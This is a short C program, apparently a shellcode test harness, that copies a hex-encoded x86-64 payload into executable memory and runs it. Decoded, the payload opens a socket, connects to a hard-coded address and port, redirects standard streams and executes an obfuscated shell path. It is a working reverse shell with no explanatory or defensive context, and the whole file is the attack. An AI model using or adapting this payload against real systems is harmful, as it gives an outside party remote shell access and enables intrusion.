#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

unsigned char buf[] = "\x48\x29\xd2\x40\x28\xff\x40\xfe\xc7\x40\xfe\xc7\xb0\x30\x2c\x07\x40\x30\xf6\x40\xfe\xc6\x0f\x05\x48\x97\x41\xbc\x0b\x01\x03\x10\x49\x81\xec\x01\x01\x01\x01\x4d\x31\xd2\x41\x52\x41\x54\x66\x68\x10\xe1\x66\x6a\x02\x54\x5e\xb2\x11\xfe\xca\xb0\x15\x48\x6b\xc0\x02\x0f\x05\x6a\x21\x58\x40\xb7\x02\x40\xfe\xc7\x48\x31\xf6\x0f\x05\xb0\x22\xfe\xc8\x40\xb7\x02\x40\xfe\xc7\x40\x30\xf6\x40\xb6\x02\x48\x6b\xf6\x02\x40\x80\xee\x03\x0f\x05\x6a\x21\x58\x40\xb7\x02\x40\xfe\xc7\x40\x30\xf6\x40\xb6\x02\x0f\x05\x49\xbe\x4d\x29\x5b\x7c\x80\xe8\xbd\xb5\x49\xbd\x62\x06\x39\x15\xee\xc7\xce\xdd\x4d\x31\xee\x4d\x29\xed\x4c\x89\x6c\x24\xf8\x48\x83\xec\x08\x41\x56\x48\x89\xe7\x4d\x29\xdb\x41\x53\x48\x89\x7c\x24\xf8\x48\x83\xec\x08\x48\x89\xe6\xb0\x1e\x48\x6b\xc0\x02\xfe\xc8\x48\x31\xd2\x0f\x05\xb0\x3b\xfe\xc0\x48\x29\xff\x0f\x05";

int main(int argc, char **argv) {

    void *ptr = mmap(0, 0x22, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON
            | MAP_PRIVATE, -1, 0);

    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }

    memcpy(ptr, buf, sizeof(buf));
    sc = ptr;

    sc();

    return 0;
}